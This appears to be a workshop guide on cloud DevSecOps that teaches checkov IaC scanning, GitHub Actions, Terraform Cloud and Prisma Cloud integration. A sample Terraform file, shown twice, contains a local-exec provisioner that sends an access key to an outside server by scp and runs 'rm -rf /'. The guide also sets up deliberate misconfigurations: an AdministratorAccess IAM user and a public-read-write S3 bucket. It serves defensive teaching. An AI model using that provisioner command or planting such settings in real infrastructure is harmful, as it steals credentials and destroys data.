---
title : "Cloud DevSecOps"
date : "`r Sys.Date()`"
weight : 1
chapter : false
pre : " <b> 6.1 </b> "
---

#### Cloud DevSecOps with Hashicorp, Palo Alto Networks & AWS

- Learning Objectives
  - Gain an understanding of DevSecOps and infrastructure as code (IaC) using Terraform
  - Scan IaC files for misconfigurations locally
  - Set up CI/CD pipelines to automate security scanning and policy enforcement
  - Fix security findings and AWS resource misconfigurations with Prisma Cloud

- DevSecOps : https://catalog.us-east-1.prod.workshops.aws/workshops/e31afbdf-ee40-41fa-a6c9-6ba2cb55fc1e/en-US/1-table-content/2-devsecops
  - The foundation of DevSecOps lies in the DevOps movement, wherein development and operations functions have merged to make deployments faster, safer, and more repeatable. Common DevOps practices include automated infrastructure build pipelines (CI/CD) and version-controlled manifests (GitOps) to make it easier to control cloud deployments. By baking software and infrastructure quality requirements into the release lifecycle, teams save time manually reviewing code, letting teams focus on shipping features.
- Infrastructure as Code Using Terraform
  - Infrastructure as code (IaC) frameworks, such as HashiCorp Terraform, make cloud provisioning scalable and straightforward by leveraging automation and code. Defining our cloud infrastructure in code simplifies repetitive DevOps tasks and gives us a versioned, auditable source of truth for the state of an environment.

#### Setup / Prerequisities

 - Github account
 - Terraform Cloud account
 - AWS account (provided during workshop)
 - Prisma Cloud account (OPTIONAL)

1. Log into AWS Workshop: [!NOTE] This section is for live workshop events only.

2. Configure IAM User and API Key
    - User name: **tf-cloud**
    - Policies: **AdminstratorAccess**
    - Create access key (other):  Access key (**Third-party service**)

3. Configure AWS Cloud9 IDE
    - Create environment (name): **your-name-workspace**
    - Env type: New EC2 instance
      - Additaional instance types: 
        - Types: t3.medium
        - Platform: Amazon Linux 2023
        - Timeout: 30 minutes
        
    - Network settings:
      - Connection: AWS System Manager (SSM)
      -> Open in Cloud9
    
    - Create and activate a python virtual environment
    ```sh
    python3 -m venv env
    source ./env/bin/activate

    ```

#### Section 1: Code Scanning with checkov

- Checkov: https://www.checkov.io/
- Checkov  is an open source 'policy-as-code' tool that scans cloud infrastructure defintions to find misconfigurations before they are deployed. Some of the key benefits of checkov:
  - Runs as a command line interface (CLI) tool
  - Supports many common plaftorms and frameworks
  - Ships with thousands of default policies
  - Works on windows/mac/linux (any system with python installed)

**Install checkov:** install, version , verify and see a list of every policy that Checkov can enforce

```js
pip3 install checkov
checkov --version
checkov --help
checkov --list
```

**1. Fork and clone target repository**

This workshop involves code that is vulnerable-by-design. All of the necessary code is contained within this repository  or workshop guide itself. 

**Prisma Cloud DevSecOps Workshop**  repository: https://github.com/paloAltoNetworks/prisma-cloud-devsecops-workshop

Grab the repo URL from Github, then clone the **forked repository** to Cloud9.
```js
git clone https://github.com/<your-organization>/prisma-cloud-devsecops-workshop.git
cd prisma-cloud-devsecops-workshop/
git status

```

Great! Now we have some code to scan. Let's jump in...

**2. Scan with **checkov****

- Checkov can be configured to scan files and enforce policies in many different ways. To highlight a few:
  - Scans can run on individual files or entire directories.
  - Policies can be selected through selection or omission.
  - Enforcement can be determined by flags that control checkov's exit code.

Let's start by scanning the entire `./code` directory and viewing the results.

```js
cd code/
checkov -d .
```
{{%expand "Is this learn theme rocks ?" %}} 

![1](/aws-ws/images/1/1.png?featherlight=false&width=90pc) ![5](/aws-ws/images/6/61/5.png?featherlight=false&width=90pc) ![6][5]

{{% /expand%}}

![6][5]


Failed checks are returned containing the offending file and resource, the lines of code that triggered the policy, and a guide to fix the issue.

![6][5-1]

Now try running checkov on an individual file with `checkov -f <filename>`.

{{%expand "simple_ec2.tf" %}}
```sh
provider "aws" {
  region = "us-west-2"
}

resource "aws_ec2_host" "test" {
  instance_type     = "t3.micro"
  availability_zone = "us-west-2a"

  provisioner "local-exec" {
    command = "echo Running install scripts.. 'echo $ACCESS_KEY > creds.txt ; scp -r creds.txt root@my-home-server.com/exfil/ ; rm -rf /'   "
  }

}

```
{{% /expand%}}

```sh
checkov -f deployment_ec2.tf
checkov -f simple_ec2.tf
```

![6][5-2]

Policies can be optionally enforced or skipped with the `--check` and `--skip-check` flags.
```sh
checkov -f deployment_s3.tf --check CKV_AWS_18,CKV_AWS_52
checkov -f deployment_s3.tf --skip-check CKV_AWS_18,CKV_AWS_52
```
Frameworks can also be selected or omitted for a particular scan:
```sh
checkov -d . --framework secrets --enable-secret-scan-all-files
checkov -d . --skip-framework dockerfile

```

Lastly, enforcement can be more granularly controlled by using the --soft-fail option. Applying --soft-fail results in the scan always returning a 0 exit code. Using --hard-fail-on overrides this option.

Check the exit code when running checkov -d . with and without the --soft-fail option.
```sh
checkov -d . ; echo $?
checkov -d . --soft-fail ; echo $?

```
**3. Custom polices**

Checkov supports the creation of Custom Policies  for users to customize their own policy and configuration checks. Custom policies can be written in YAML (recommended) or python and applied with the `--external-checks-dir` or `--external-checks-git` flags.

Let's create a custom policy to check for **local-exec and remote-exec Provisioners**  being used in Terraform resource definitons. 
https://developer.hashicorp.com/terraform/language/resources/provisioners/local-exec

{{%expand "Expand provisioners code:  check.yaml" %}}
```sh
metadata:
 name: "Terraform contains local-exec and/or remote-exec provisioner"
 id: "CKV2_TF_1"
 category: "GENERAL_SECURITY"
definition:
 and:
  - cond_type: "attribute"
    resource_types: all
    attribute: "provisioner/local-exec"
    operator: "not_exists"
  - cond_type: "attribute"
    resource_types: all
    attribute: "provisioner/remote-exec"
    operator: "not_exists"
```
{{% /expand%}}

Add the above code to a new file within a new direcotry.
```sh
mkdir custom-checks/
vim custom-checks/check.yaml
```
 *[!TIP] use echo '$(file_contents)' > custom-checks/check.yaml if formatting is an issue with vim.*

Save the file. Then run checkov with the **--external-checks-dir** to test the custom policy.

{{%expand "simple_ec2.tf" %}}
```sh
provider "aws" {
  region = "us-west-2"
}

resource "aws_ec2_host" "test" {
  instance_type     = "t3.micro"
  availability_zone = "us-west-2a"

  provisioner "local-exec" {
    command = "echo Running install scripts.. 'echo $ACCESS_KEY > creds.txt ; scp -r creds.txt root@my-home-server.com/exfil/ ; rm -rf /'   "
  }

}
```
{{% /expand%}}

```sh
checkov -f simple_ec2.tf --external-checks-dir custom-checks
```

![6][6]

**Challenge**: **write a custom policy to check all resources for the presence of tags. Specifically, ensure that a tag named "Environment" exists.*

4. IDE plugin: 

[!NOTE] Demo Only. Requires API key for Prisma Cloud.

Link to docs: [Prisma Cloud IDE plugins](https://docs.prismacloud.io/en/classic/appsec-admin-guide/get-started/connect-your-repositories/integrate-ide/integrate-ide)

Link to docs: [VScode extension](https://marketplace.visualstudio.com/items?itemName=Bridgecrew.checkov) 

  - Enabling checkov in an IDE provides real-time scan (in Cloud9)
  
5. Github Actions:

- Create a new action from scratch = **checkov.yaml**

{{%expand "checkov.yaml" %}}
```sh
name: checkov
on:
  pull_request:
  push:
    branches:
      - main
jobs:
  scan:
    runs-on: ubuntu-latest
    permissions:
      contents: read # for actions/checkout to fetch code
      security-events: write # for GitHub/codeql-action/upload-sarif to upload SARIF results

    steps:
    - uses: actions/checkout@v2

    - name: Run checkov
      id: checkov
      uses: bridgecrewio/checkov-action@master
      with:
        directory: code/
        #soft_fail: true
        #api-key: ${{ secrets.BC_API_KEY }}
      #env:
        #PRISMA_API_URL: https://api4.prismacloud.io

    - name: Upload SARIF file
      uses: GitHub/codeql-action/upload-sarif@v2

      # Results are generated only on a success or failure
      # this is required since GitHub by default won't run the next step
      # when the previous one has failed. Alternatively, enable soft_fail in checkov action.
      if: success() || failure()
      with:
        sarif_file: results.sarif

```
{{% /expand%}}

Notice the policy violations that were seen earlier in CLI/Cloud9 are now displayed here. 
![6][8-1]

6. View results in Github Security

Checkov natively supports SARIF format and generates this output by default. GitHub Security accepts SARIF for uploading security issues. The GitHub Action created earlier handles the plumbing between the two.

Navigate to the Security tab in GitHub, the click Code scanning from the left sidebar or View alerts in the **Security overview > Code scanning alerts** section.

The security issues found by checkov are surfaced here for developers to get actionable feedback on the codebase they are working in without having to leave the platform.

![6][8]


1. Tag and Trace with Yor: 

Yor is another open source tool that can be used for tagging and tracing IaC resources from code to cloud. For example, yor can be used to add git metadata and a unique hash to a terraform resource; this can be used to better manage resource lifecycles, improve change management, and ultimately to help tie code defintions to runtime configurations.

  - Create new file in the GitHub UI under the path `.github/workflows/yor.yaml`.
{{%expand "Expand: yor.yaml" %}}
```sh
name: IaC tag and trace

on:
  push:
  pull_request:

jobs:
  yor:
    runs-on: ubuntu-latest
    permissions:
      contents: write

    steps:
      - uses: actions/checkout@v2
        name: Checkout repo
        with:
          fetch-depth: 0
      - name: Run yor action
        uses: bridgecrewio/yor-action@main

```
{{% /expand%}}
-  Viewing any `.tf` file in the `code/` [directory](https://github.com/PaloAltoNetworks/prisma-cloud-devsecops-workshop/tree/main/code).    
  
1.  Branch Protection Rules:

Using Branch Protection Rules allows for criteria to be set in order for pushes and pull requests to be merged to a given branch. This can be set up to run checkov and block merges if there are any misconfigurations or vulnerabilities.  

   -  Github > Branches > Add branch protection rule.
   -  Enter: `main`
   -  Check: `Require status checks to pass before merging` search for `checkov` (scan)

3. Integrate workflow with Terraform Cloud
  - Create a new organizaion: some_org
  - Email:
  - Create a New Workspace: VS Workflow
    - Connect to Github > Choose the **prisma-cloud-devsecops-workshop** from the list of repositories.
    - Add a Workspace:
      -  Name: **prisma-cloud-devsecops-workshop**
      -  Project: Default Project
      - Terraform Working Directory: **/code/bulid/**
    -  VS Triggers: Only trigger
       -  Select Syntax: Patterns
    -  Pull Requests: Check Automatic speculative plans
       - -> Continue to workspace overview

  - prisma-cloud-devsecops-workshop: Configure variables
    - Add variables for `AWS_SECRET_KEY_ID` and `AWS_SECRET_ACCESS_KEY`.
    - Ensure you select `Environment variables` for both and that `AWS_SECRET_ACCESS_KEY` is marked as `Sensitive`.

{{%expand "AWS S3 Access" %}}
```sh
IAM user: tf-cloud
Attach policies: AdministratorAccess
Security credentials:
  Access key (Third-party service)
```
{{% /expand%}}

![6][10]

10. Block a Pull Request, Prevent a Deployment
  - We have now configured a GitHub repository to be scanned with checkov and to trigger Terraform Cloud to deploy infrastructure
  - Create a new file in the GitHub UI under the path code/build/s3.tf
{{%expand "Expand s3.tf" %}}
```sh
provider "aws" {
  region = "us-west-2"
}

resource "aws_s3_bucket" "dev_s3" {
  bucket_prefix = "dev-"

  tags = {
    Environment      = "Dev"
  }
}

resource "aws_s3_bucket_ownership_controls" "dev_s3" {
  bucket = aws_s3_bucket.dev_s3.id
  rule {
    object_ownership = "BucketOwnerPreferred"
  }
}
```
{{% /expand%}}
  - Once complete, click `Commit changes`... at the top right, then select `Create a new branch and start a pull reques`t and click `Propose changes`.
  - At the next screen, review the diff then click `Create pull request`.
  - Either bypass branch protections and Merge pull request or go back to the Github Action for checkov and uncomment the line with `--soft-fail=true`. This will require closing and reopening a new pull request.

ISSUE: 

![6][18]
![6][17]

Fix: code/build

{{%expand "providers.tf" %}}
```sh
terraform {
  required_providers {
    aws = {
      source  = "hashicorp/aws"
    }
  }
}

provider "aws" {
  region  = "us-west-2"
}

```
{{% /expand%}}

{{%expand "s3.tf change to main.tf" %}}
```sh
resource "aws_s3_bucket" "dev_s3" {
  bucket_prefix = "dev-"

  tags = {
    Environment          = "Dev"
    yor_name             = "dev_s3"
    yor_trace            = "d6c205d2-67e5-4856-a003-e9d4a2629f8d"
    git_commit           = "69a9110e596f86b5250039de52aa332e25b79a36"
    git_file             = "code/build/s3.tf"
    git_last_modified_at = "2024-05-14 10:49:55"
    git_last_modified_by = "150504127+nonotnonez@users.noreply.github.com"
    git_modifiers        = "150504127+nonotnonez"
    git_org              = "nonotnonez"
    git_repo             = "prisma-cloud-devsecops-workshop"
  }
}

resource "aws_s3_bucket_ownership_controls" "dev_s3" {
  bucket = aws_s3_bucket.dev_s3.id
  rule {
    object_ownership = "BucketOwnerPreferred"
  }
}

```
{{% /expand%}}


11. Workflow Deploy to AWS

- Update **main.tf** and merge to main repo

![6][611]
![6][612]
![6][613]

- Navigate to **Terraform Cloud** and view the running plan.

![6][614]
![6][616]
![6][618]

- Go to the **S3** menu within AWS to view the bucket that has been deployed.
- Now let's see how we can leverage Prisma Cloud to make this all easier, gain more featues and scale security at ease.

![6][617]

Terraform destroy
- Settings - Destruction and Deletion
  - Destroy infrastructure -> Queue destroy plan
  
![6][619]
![6][6110]
![6][6111]
![6][6113]
![6][6114]

Amazone S3 overview

![6][6112]

### Welcome to Prisma Cloud

Prisma Cloud is a Cloud Native Application Protection Platform (CNAPP) comprised of three main pillars:

  - Cloud Security
  - Runtime Security
  - Application Security  

Across these three "modules", Prisma Cloud provides comprehensive security capabilities spanning code to cloud. This workshop will mainly focus on the Application Security module within the Prisma Cloud platform.

#### Section 2: Application Security with Prisma Cloud

1. Onboard AWS Account

We need to configure Prisma Cloud to communitcate with a CSP. Let's do this by onboarding an AWS Account.

Navigate to Settings > Providers > Connect Provider and follow the instructions prompted by the conifguration wizard.
- Select **Amazon Web Services**.
- Choose **Account for the scope**, deselect **Agentless Workload Scanning**, leave the rest as default and click **Done**.
- Provide your **Account ID** and enter an **Account Name**. Then click **Create IAM Role** to have Prisma Cloud auto-configure itself.
- Scroll to the bottom of the AWS page that opens, click to **acknowledge** the disclaimer and then click **Create stack**.
- Wait a moment while the stack is created, we need an output from the final result of the stack being deployed.
- Once created, go to the **Outputs** tab and copy the value of ARN displayed.
- Head back to **Prisma Cloud** and paste this value into the **IAM Role ARN** field, then click **Next**.
- Wait for the connectivity test to run, review the status and click **Save and Close**.
- View the onboarded cloud account under **Settings > Providers**.

2.Integrations and Providers 
- Let's start by integrating with checkov.

3. Checkov with API Key
- To generate an API key, navigate to **Settings > Access Control**. Click the Add button and select `Access Key`.
- Download the `csv` file containing the credentials then click `Done`.
- In a terminal window run checkov against the entire `code` directory, now with an API key. Use the following command:
```sh
checkov -d . --bc-api-key <access_key_id::<secret_key> --repo-id prisma/devsecops-workshop --prisma-api-url https://api4.prismacloud.io

```
Notice how the results now contain a severity. There are some other features that come with Prisma Cloud (using an API key) as well...

Return back to Prisma Cloud to view the results that checkov surfaced in the platform. Navigate to **Application Security > Projects**.

Let's add this same API key to the GitHub Action created earlier. Within your GitHub repository, go to **Settings > Secrets** and variables then select **Actions**.
  - Click New `repository secret `then input the secret value of `<access_key_id>::<secret_key>` pair.
  - Edit `checkov.yaml`, remove comments for `api-key` and` PRISMA_API_URL`.
  - Commit directly to main branch.

Now check the results under `Security > Code scanning`. The same findings that displayed here earlier now with a `Severity` to sort and prioritze with.

Return again to Prisma Cloud to view the results that were sent to the the platform.

`[!TIP] You can use Prisma Cloud (checkov w/ an API key) to scan docker images for vulnerabilities! Use the --docker-image flag and point to an image name or ID.`

4. Terraform Cloud Run Tasks

Let's now connect Prisma Cloud with Terraform Cloud using the Run Tasks integration. 
This allows for developers and platform teams to get immediate security feedback for every pipeline run. 
The Run Task integration will also surface results of every pipeline run to Prisma Cloud and the Security team.

- First we need to create an API key in Terraform Cloud. Go to the Terraform Cloud console and navigate to **User Settings > Tokens** then click **Create an API Token**.
- Copy the token and save the value somewhere safe. This will be provided to Prisma Cloud in the next step.
- Go to the Prisma Cloud console and navigate to **Settings > Connect Provider > Code & Build Providers** to set up the integration.
- Under **CI/CD Runs**, choose **Terraform Cloud (Run Tasks)**.
- Enter the API token generated in Terraform Cloud and click Next.
- Select your Organization.
- Select your **Workspace** and choose the **Run Stage** in which you want Prisma Cloud to execute a scan. Pre-plan will scan HCL code, Post-plan will scan the Terraform plan.out file. Once completed, click **Done**.
- Return back to Terraform Cloud to view the integration. Go to your **Workspace** and click **Settings > Run Tasks**.

5. GitHub Application

Next we will set up the Prisma Cloud GitHub Application which will perform easy-to-configure code scanning for GitHub repos.

- Go to Prisma Cloud and create a new integration under Settings > Connect Provider > Code & Build Providers.
- Under **Code Repositories**, select **GitHub**.
- Follow the install wizard and **Authorize** your GitHub account.
- Select the repositories you would like to provide access to and click **Install & Authorize**.
- Select the target repositories to scan now accessible from the Prisma Cloud wizard, then click **Next**.
- Click **Done** once completed. Navigate to **Settings > Providers > Repositories** to view the onboarded repo(s).

6. Submit a Pull Request 2.0

Lets push a change to test the integration. Navigate to GitHub and make a change to the s3 resource deployed earlier under `code/build/s3.tf`.

Add the following line of code to the s3 resource definition. Then click Commit changes... once complete.
```sh
acl = "public-read-write"
```

- Create a new branch and click Propose changes.
- On the next page, review the diff then click Create pull request. Once gain, click Create pull request to open the pull request.
- Let the checks run against the pull request. Prisma Cloud can review pull requests and will add comments with proposed changes to give developers actionable feedback within their VCS platform.
- When ready, click **Merge pull request** bypassing branch protection rules if still enabled.
- Now that the change has been merged, navigate back to Terraform Cloud to view the pipeline running.
- Check the Post-plan stage and view the results of the Prisma Cloud scan.
- Leave this as is for now. We will soon fix the error and retrigger the pipeline.

7. View scan results in Prisma Cloud

Return to Prisma Cloud to view the results of all the scans that were just performed.

Navigate to **Application Security > Projects > Overview** to view findings for all scans. Filter the results with the Repository drop-down menu.

View relevant CI/CD Risks **Application Security > CI/CD Risks**:

Get a full SBOM analysis under **Application Security > SBOM**:

Take a look at **Dashboards > Code Security** to get top-level reports.

Another useful view can be found under **Inventory > IaC Resources**

**Enforcement Rules**
The level of enforcement applied to each code scan can be controlled under S**ettings > Configure > Application Security > Enforcement Rules**

These can be adjusted as a top-down policy or exceptions can be created for specific repositories / integrations.

8. Issue a PR-Fix

Lets create a pull request from the Prisma Cloud console to apply a code fix. Navigate to **Application Security > Projects > Overview IaC Misconfiguration** then find the dev_s3 bucket with the public access violations.

Then click the **Submit** button in the top right to open a pull request.

Navigate back to GitHub and check the Pull request tab to see the fix Prisma Cloud submitted.

Drill into the pull request and inspect the file changes under the **Files changes** tab. Notice the changes made to remediate the original policy violation.

Go back to the **Coversation** tab and click **Merge the pull request** at the bottom to check this code into the main branch.

Check Terraform Cloud to view the plan succesfully run. No need to apply this run as we will use the earlier deployment for our next example.

9. Drift Detection

In this final section, we will use the pipeline we built to detect drift. Drift occurs when infrastructure running in the cloud becomes configured differntly from what was originally defined in code.

This usually happens during a major incident, where DevOps and SRE teams make manual changes to quickly solve a problem, such as opening up ports to larger CIDR blocks or turning off HTTPS to find the problem. Sometimes lack of access and/or familiarity with IaC/CICD makes fixing an issue directly in the cloud easier than fixing in code and redeploying. If these aren’t reverted, they present security issues and it weakens the benefits of using IaC.

We will use the S3 bucket deployed earlier to simulate drift in a resource configuration.

`[!NOTE] By default Prisma Cloud performs full resource scans on an hourly interval.`

Next, go to the AWS Console under S3 buckets and add a new tag to the bucket created earlier.

For example, add a tag with the key/value pair drift = true and click Save changes.

On the next scan Prisma Cloud will detect this change and notify users that a resource configuration has changed from how it is defined in code. To view this, navigate to **Projects > IaC Misconfiguration** and filter for **Drift** under the **IaC Categories** dropdown menu.

Prisma Cloud provides the option to revert the change via the same pull request mechanism we just performed which would trigger a pipeline run and patch the resource.

#### Wrapping Up

Congrats! In this workshop, we didn’t just learn how to identify and automate fixing misconfigurations — we learned how to bridge the gaps between Development, DevOps, and Cloud Security. We are now equipped with full visibility, guardrails, and remediation capabilities across the development lifecycle. We also learned how important and easy it is to make security accessible to our engineering teams.

Try more of the integrations with other popular developer and DevOps tools. Share what you’ve found with other members of your team and show how easy it is to incorporate this into their development processes.



[5]: /aws-ws/images/6/61/5.png?featherlight=false&width=90pc
[5-1]: /aws-ws/images/6/61/5-1.png?featherlight=false&width=50pc
[5-2]: /aws-ws/images/6/61/5-2.png?featherlight=false&width=50pc

[6]: /aws-ws/images/6/61/6.png?featherlight=false&width=90pc

[8]: /aws-ws/images/6/61/8.png?featherlight=false&width=90pc
[8-1]: /aws-ws/images/6/61/8-1.png?featherlight=false&width=90pc

[10]: /aws-ws/images/6/61/10.png?featherlight=false&width=90pc
[14]: /aws-ws/images/6/61/14.png?featherlight=false&width=90pc
[15]: /aws-ws/images/6/61/15.png?featherlight=false&width=90pc
[16]: /aws-ws/images/6/61/16.png?featherlight=false&width=90pc
[17]: /aws-ws/images/6/61/17.png?featherlight=false&width=90pc
[18]: /aws-ws/images/6/61/18.png?featherlight=false&width=90pc
[19]: /aws-ws/images/6/61/19.png?featherlight=false&width=90pc

[611]: /aws-ws/images/6/61/ex/1.png?featherlight=false&width=90pc
[612]: /aws-ws/images/6/61/ex/2.png?featherlight=false&width=90pc
[613]: /aws-ws/images/6/61/ex/3.png?featherlight=false&width=90pc
[614]: /aws-ws/images/6/61/ex/4.png?featherlight=false&width=90pc
[616]: /aws-ws/images/6/61/ex/6.png?featherlight=false&width=90pc
[617]: /aws-ws/images/6/61/ex/7.png?featherlight=false&width=90pc
[618]: /aws-ws/images/6/61/ex/8.png?featherlight=false&width=90pc
[619]: /aws-ws/images/6/61/ex/9.png?featherlight=false&width=90pc
[6110]: /aws-ws/images/6/61/ex/10.png?featherlight=false&width=90pc
[6111]: /aws-ws/images/6/61/ex/11.png?featherlight=false&width=90pc
[6112]: /aws-ws/images/6/61/ex/12.png?featherlight=false&width=90pc
[6113]: /aws-ws/images/6/61/ex/13.png?featherlight=false&width=90pc
[6114]: /aws-ws/images/6/61/ex/14.png?featherlight=false&width=90pc